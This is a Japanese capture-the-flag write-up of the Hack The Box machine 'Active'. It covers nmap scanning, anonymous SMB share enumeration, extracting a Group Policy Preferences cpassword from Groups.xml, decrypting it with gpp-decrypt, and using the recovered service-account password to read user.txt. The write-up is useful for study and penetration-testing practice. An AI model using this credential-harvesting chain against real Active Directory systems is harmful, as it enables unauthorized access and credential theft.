# Recon

```
┌──(shoebill㉿shoebill)-[~/Active_10.10.10.100]
└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.10.100
...
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-10-18 03:49:47Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
...
```

SMBシェアのAnonymousログインが可能：

```
┌──(shoebill㉿shoebill)-[~/Active_10.10.10.100]
└─$ smbclient -L 10.10.10.100          
Password for [WORKGROUP\shoebill]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk
```

見慣れないReplicationが怪しいので中身を再帰的にリストアップしてやる：

```
┌──(shoebill㉿shoebill)-[~/Active_10.10.10.100]
└─$ smbmap -R Replication -H 10.10.10.100 --depth 10
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
...
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\*
        dr--r--r--                0 Sat Jul 21 19:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 19:37:44 2018    ..
        fr--r--r--              533 Sat Jul 21 19:38:11 2018    Groups.xml
```

Groups.xmlというこれまた怪しいファイルが見つかったのでダウンロードする：
```
┌──(shoebill㉿shoebill)-[~/Active_10.10.10.100]
└─$ smbclient //10.10.10.100/Replication
Password for [WORKGROUP\shoebill]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> cd "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups"
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml
```
# initial shell

Groups.xml中身をみるとドメイン名、ユーザ名、cpasswordなどの情報が見つかる：

```
┌──(shoebill㉿shoebill)-[~/Active_10.10.10.100]
└─$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
</User>
</Groups>
```
調べてみるとこのcpasswordはクラック可能だとわかる。

Kaliにある`gpp-decrypt`でクラックする：

```
┌──(shoebill㉿shoebill)-[~/Active_10.10.10.100]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```
次のようにuser.txtをゲット：

```
┌──(shoebill㉿shoebill)-[~/Active_10.10.10.100]
└─$ smbclient -U 'svc_tgs%GPPstillStandingStrong2k18' //10.10.10.100/Users
Try "help" to get a list of possible commands.
smb: \> dir 
  .                                  DR        0  Sat Jul 21 23:39:20 2018
  ..                                 DR        0  Sat Jul 21 23:39:20 2018
  Administrator                       D        0  Mon Jul 16 19:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 14:06:44 2009
  Default                           DHR        0  Tue Jul 14 15:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 14:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 13:57:55 2009
  Public                             DR        0  Tue Jul 14 13:57:55 2009
  SVC_TGS                             D        0  Sun Jul 22 00:16:32 2018
  
smb: \> dir \SVC_TGS\Desktop\
  .                                   D        0  Sun Jul 22 00:14:42 2018
  ..                                  D        0  Sun Jul 22 00:14:42 2018
  user.txt                           AR       34  Tue Oct 18 11:43:55 2022
```

今回のボックスはこのユーザのシェルをとる必要がない。というかKaliだけではこのユーザのシェルはとれなかった。

しかしippsecがWindowsマシンを使ってシェルをとる方法を紹介してる。

